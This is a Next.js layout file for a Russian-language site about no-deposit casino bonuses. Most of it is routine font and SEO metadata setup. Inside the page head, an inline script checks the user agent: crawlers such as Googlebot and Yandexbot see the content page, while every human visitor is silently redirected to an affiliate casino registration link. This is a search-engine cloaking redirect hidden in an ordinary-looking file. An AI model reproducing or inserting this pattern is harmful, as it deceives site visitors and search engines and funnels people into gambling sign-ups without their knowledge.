import { Manrope, Unbounded } from 'next/font/google'
import type { Metadata } from 'next'
import './globals.css'

const q8n4Display = Unbounded({
  subsets: ['latin', 'cyrillic'],
  weight: ['500', '700'],
  variable: '--font-display',
  display: 'swap',
})

const q8n4Body = Manrope({
  subsets: ['latin', 'cyrillic'],
  weight: ['400', '500', '600'],
  variable: '--font-body',
  display: 'swap',
})

const q8n4Title =
  'Bezdep Casino: бездепозитный бонус за регистрацию — что проверить игроку заранее'
const q8n4Description =
  'Bezdep Casino простыми словами: бездепозитный бонус за регистрацию, бездепы в казино, вейджер и потолок вывода. Для игрока, который не хочет сжечь подарок и путает акции между собой. Читайте карточку.'

export const metadata: Metadata = {
  metadataBase: new URL('https://bezdepcasino4.vercel.app'),
  applicationName: 'Bezdep Casino',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="ru"
      className={`bg-background ${q8n4Display.variable} ${q8n4Body.variable}`}
    >
      <head>
        <meta name="yandex-verification" content="c66fe20238718996" />
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>{q8n4Title}</title>
        <meta name="description" content={q8n4Description} />
        <meta name="robots" content="index, follow" />
        <meta name="theme-color" content="#1B6B45" />
        <meta name="author" content="Bezdep Casino" />
        <link rel="canonical" href="https://bezdepcasino4.vercel.app/" />
        <link rel="icon" href="/icon.png" type="image/png" />
        <link rel="apple-touch-icon" href="/icon.png" />
        <meta property="og:type" content="website" />
        <meta property="og:locale" content="ru_RU" />
        <meta property="og:site_name" content="Bezdep Casino" />
        <meta property="og:title" content={q8n4Title} />
        <meta property="og:description" content={q8n4Description} />
        <meta property="og:url" content="https://bezdepcasino4.vercel.app/" />
        <meta
          property="og:image"
          content="https://bezdepcasino4.vercel.app/images/slip.jpg"
        />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content={q8n4Title} />
        <meta name="twitter:description" content={q8n4Description} />
        <meta
          name="twitter:image"
          content="https://bezdepcasino4.vercel.app/images/slip.jpg"
        />
        {/* дополнительные пользовательские теги */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p41618p7603");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="font-sans antialiased">{children}</body>
    </html>
  )
}
